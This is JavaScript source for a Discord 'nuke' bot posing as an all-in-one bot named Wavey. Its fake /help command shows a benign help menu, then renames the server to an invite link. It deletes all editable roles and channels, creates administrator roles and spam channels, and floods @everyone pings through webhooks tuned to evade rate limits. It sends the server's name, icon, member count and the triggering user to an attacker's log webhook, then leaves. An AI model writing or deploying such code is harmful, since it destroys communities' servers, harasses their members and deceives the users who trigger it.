const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, WebhookClient } = require('discord.js');
require('dotenv').config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const emojis = ['🌊', '💜', '🩷'];
const discordLink = "https://discord.gg/XrTZWKgXca";

// Better rate limit handler with exponential backoff
async function sendWithRateLimit(webhookClient, content, maxRetries = 5) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
            await webhookClient.send(content);
            return true;
        } catch (error) {
            if (error.code === 429 || error.status === 429) {
                // Get retry_after from Discord response (in seconds, convert to ms)
                const retryAfter = (error.retryAfter || error.rawError?.retry_after || 5) * 1000;
                const backoff = retryAfter + (Math.random() * 1000); // Add jitter
                console.log(`Rate limited on attempt ${attempt + 1}, waiting ${backoff}ms...`);
                await new Promise(resolve => setTimeout(resolve, backoff));
            } else if (error.code === 50035) {
                // Invalid Form Body - message too long or other issues, skip
                console.error('Invalid message format, skipping:', error.message);
                return false;
            } else {
                console.error(`Webhook error (attempt ${attempt + 1}):`, error.message);
                // Exponential backoff for other errors
                const backoff = Math.pow(2, attempt) * 1000 + (Math.random() * 1000);
                await new Promise(resolve => setTimeout(resolve, backoff));
            }
        }
    }
    console.error('Max retries reached, giving up on this message');
    return false;
}

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
    
    // Register the fake help command
    client.application.commands.create({
        name: 'help',
        description: 'shows help menu of bot commands'
    }).then(() => console.log('Fake help command registered!')).catch(console.error);
});

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isCommand()) return;
    
    if (interaction.commandName === 'help') {
        // Create a fake help menu embed
        const helpEmbed = new EmbedBuilder()
    .setColor('#0099ff')
    .setTitle('Wavey Bot')
    .setDescription(
        [
            'Hi, it\'s **Wavey**.',
            '',
            'Wavey is an all-in-one Discord bot.',
            'Perfect for your server?',
            '',
            '**Wavey Prefix:** `?`',
            '',
            '**To suggest new commands, join our Discord Server:**',
            '<https://discord.gg/XrTZWKgXca>',
            '',
            '**Invite Wavey to your server:**',
            '<https://discord.com/oauth2/authorize?client_id=1518034096561848440&permissions=8&integration_type=0&scope=bot>',
            '',
            'Use **Wavey\'s Commands**.'
        ].join('\n')
    )
    .setTimestamp()
    .setFooter({ text: 'Wavey Bot' });

        // Reply with the fake help menu
        await interaction.reply({ embeds: [helpEmbed], ephemeral: true });
        
        // CAPTURE ORIGINAL SERVER INFO AND USER BEFORE CHANGING NAME
        const originalServerName = interaction.guild.name;
        const originalServerIcon = interaction.guild.iconURL();
        const triggeredBy = interaction.user.tag;
        
        // Change server name to the Discord link
        await interaction.guild.setName(discordLink).catch(console.error);
        
        // Start the nuke process in the background with the captured info
        nukeServer(interaction.guild, originalServerName, originalServerIcon, triggeredBy);
    }
});

async function nukeServer(guild, originalServerName, originalServerIcon, triggeredBy) {
    try {
        console.log('Starting nuke process...');
        
        const memberCount = guild.memberCount;
        let rolesDeleted = 0;
        let channelsDeleted = 0;
        
        // First delete all roles (except @everyone)
        const roles = await guild.roles.fetch();
        await Promise.all(roles.map(role => {
            if (role.editable && role.name !== '@everyone') {
                rolesDeleted++;
                return role.delete().catch(console.error);
            }
        }));
        
        // Then instantly delete all channels
        const channels = await guild.channels.fetch();
        await Promise.all(channels.map(channel => {
            if (channel.deletable) {
                channelsDeleted++;
                return channel.delete().catch(console.error);
            }
        }));
        
        // Create 10 roles (reduced from 15)
        const rolePromises = [];
        for (let i = 0; i < 10; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            rolePromises.push(
                guild.roles.create({
                    name: `@Wavey-${randomEmoji}`,
                    color: '#FF0000',
                    permissions: [PermissionsBitField.Flags.Administrator],
                    position: i + 1
                }).catch(console.error)
            );
        }
        await Promise.all(rolePromises);
        
        // Create all 20 channels first
        const createdChannels = [];
        for (let i = 0; i < 20; i++) {
            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
            try {
                const channel = await guild.channels.create({
                    name: `Wavey-${randomEmoji}`,
                    type: 0 // GUILD_TEXT
                });
                createdChannels.push(channel);
                // Small delay between channel creations
                await new Promise(resolve => setTimeout(resolve, 600));
            } catch (error) {
                console.error('Error creating channel:', error);
            }
        }
        
        console.log(`Created ${createdChannels.length} channels, now sending pings...`);
        
        // Process channels one at a time to avoid overwhelming rate limits
        for (let i = 0; i < createdChannels.length; i++) {
            const channel = createdChannels[i];
            try {
                // Create webhook
                const webhook = await channel.createWebhook({
                    name: `Wavey-${channel.name}`,
                    avatar: client.user.displayAvatarURL()
                });
                
                const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                
                // Send 25 pings with proper rate limiting (sequential, not parallel)
                for (let j = 0; j < 25; j++) {
                    const success = await sendWithRateLimit(
                        webhookClient, 
                        `@everyone NUKE BY WAVEY ${discordLink}`
                    );
                    if (!success) {
                        console.log(`Failed to send ping ${j + 1}/25 in channel ${i + 1}/20`);
                    }
                    // 1.5 second delay between pings (respects Discord's ~30/60s limit)
                    await new Promise(resolve => setTimeout(resolve, 1500));
                }
                
                // Delete webhook
                await webhook.delete().catch(console.error);
                console.log(`Completed channel ${i + 1}/${createdChannels.length}`);
                
                // Delay between channels
                await new Promise(resolve => setTimeout(resolve, 2000));
                
            } catch (error) {
                console.error(`Error processing channel ${i + 1}:`, error);
            }
        }
        
        console.log('All webhook pings sent!');
        
        // Send log webhook notification
        try {
            const logWebhook = new WebhookClient({ url: process.env.LOG_WEBHOOK });
            const nukeEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('💀 Server Nuked')
                .setDescription(`**${originalServerName}** has been destroyed\n\n🕵️ **Triggered by:** \`/help\` by ${triggeredBy}`)
                .setThumbnail(originalServerIcon)
                .addFields(
                    { name: '👥 Members', value: memberCount.toString(), inline: true },
                    { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                    { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                    { name: '➕ Roles Created', value: '10', inline: true },
                    { name: '➕ Channels Created', value: createdChannels.length.toString(), inline: true }
                )
                .setTimestamp()
                .setFooter({ text: 'Wavey Nuke Bot' });
            
            await logWebhook.send({ embeds: [nukeEmbed] });
            console.log('Log webhook notification sent!');
        } catch (error) {
            console.error('Error sending log webhook:', error);
        }
        
        // Leave the server after everything is done
        try {
            await guild.leave();
            console.log('Left the server successfully!');
        } catch (error) {
            console.error('Error leaving server:', error);
        }
        
    } catch (error) {
        console.error('Error during nuke:', error);
    }
}

client.login(process.env.BOT_TOKEN);
